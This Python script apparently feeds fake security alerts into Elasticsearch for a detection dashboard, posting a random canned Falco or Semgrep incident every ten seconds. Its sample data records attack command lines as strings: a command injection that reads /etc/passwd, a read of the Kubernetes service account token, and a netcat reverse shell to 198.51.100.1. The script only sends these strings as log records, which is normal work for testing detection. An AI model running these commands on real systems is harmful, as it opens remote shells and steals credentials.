import os
import json
import time
import random
import requests
from datetime import datetime, timezone

ES_HOST = os.getenv("ELASTICSEARCH_URL", "http://localhost:9200")

INCIDENTS = [
    {
        "falco": {
            "rule": "Terminal Shell Spawned in Production Container",
            "priority": "CRITICAL",
            "output": "Interactive shell spawned in container (user=appuser process=sh parent=python)"
        },
        "origintrace": {
            "engine": "Falco_eBPF",
            "reachability_score": 85,
            "reachability_verdict": "CONFIRMED_EXPLOITABLE",
            "source_origin": {
                "file": "sample_workload/app.py",
                "function": "diagnostic_ping",
                "line": 36,
                "sink": "os.system"
            }
        },
        "process": {
            "name": "sh",
            "cmdline": "sh -c ping -c 1 127.0.0.1; cat /etc/passwd",
            "parent": "python"
        },
        "container": {
            "name": "data-gateway",
            "image": "ghcr.io/enterprise/data-gateway:v1.0.0 (Cosign Verified)"
        },
        "kubernetes": {
            "pod_name": "data-gateway-659f8-x2k41",
            "namespace": "production"
        }
    },
    {
        "falco": {
            "rule": "Unauthorized Access to Kubernetes Service Account Token",
            "priority": "ERROR",
            "output": "Sensitive token file accessed by unauthorized binary"
        },
        "origintrace": {
            "engine": "Falco_eBPF",
            "reachability_score": 90,
            "reachability_verdict": "CONFIRMED_EXPLOITABLE",
            "source_origin": {
                "file": "app/src/main.py",
                "function": "verify_api_token",
                "line": 84,
                "sink": "open(/var/run/secrets/kubernetes.io/serviceaccount)"
            }
        },
        "process": {
            "name": "python",
            "cmdline": "python -c open('/var/run/secrets/kubernetes.io/serviceaccount/token')",
            "parent": "uvicorn"
        },
        "container": {
            "name": "secops-api",
            "image": "ghcr.io/enterprise/secops-api:1.0.0 (Cosign Verified)"
        },
        "kubernetes": {
            "pod_name": "secops-api-7b89-9v11",
            "namespace": "production"
        }
    },
    {
        "falco": {
            "rule": "Outbound Reverse Shell Network Activity",
            "priority": "CRITICAL",
            "output": "Outbound TCP connection initiated by shell binary to external IP"
        },
        "origintrace": {
            "engine": "Falco_eBPF",
            "reachability_score": 100,
            "reachability_verdict": "CONFIRMED_EXPLOITABLE",
            "source_origin": {
                "file": "sample_workload/app.py",
                "function": "diagnostic_ping",
                "line": 36,
                "sink": "subprocess.Popen"
            }
        },
        "process": {
            "name": "nc",
            "cmdline": "nc 198.51.100.1 4444 -e /bin/sh",
            "parent": "sh"
        },
        "container": {
            "name": "data-gateway",
            "image": "ghcr.io/enterprise/data-gateway:v1.0.0"
        },
        "kubernetes": {
            "pod_name": "data-gateway-659f8-x2k41",
            "namespace": "production"
        }
    },
    {
        "falco": {
            "rule": "Static Vulnerability - No Runtime Trigger",
            "priority": "WARNING",
            "output": "Potential SSRF pattern detected in static AST code scanning"
        },
        "origintrace": {
            "engine": "Semgrep_SAST",
            "reachability_score": 25,
            "reachability_verdict": "STATIC_ONLY",
            "source_origin": {
                "file": "security/semgrep/tests/rules_test_suite.py",
                "function": "vulnerable_ssrf",
                "line": 28,
                "sink": "requests.get"
            }
        },
        "process": {
            "name": "semgrep",
            "cmdline": "semgrep scan --config=security/semgrep/semgrep.yml",
            "parent": "ci-runner"
        },
        "container": {
            "name": "ci-runner",
            "image": "semgrep/semgrep:latest"
        },
        "kubernetes": {
            "pod_name": "ci-runner-88f-zk1",
            "namespace": "ci-builds"
        }
    }
]

def stream_continuously():
    print("OriginTrace Real-Time Telemetry Streamer active...")
    while True:
        try:
            now = datetime.now(timezone.utc)
            index_name = f"origintrace-events-{now.strftime('%Y.%m.%d')}"
            incident = random.choice(INCIDENTS)
            doc = dict(incident)
            doc["@timestamp"] = now.isoformat()
            requests.post(f"{ES_HOST}/{index_name}/_doc", json=doc, timeout=2.0)
        except Exception:
            pass
        time.sleep(10)

if __name__ == "__main__":
    stream_continuously()
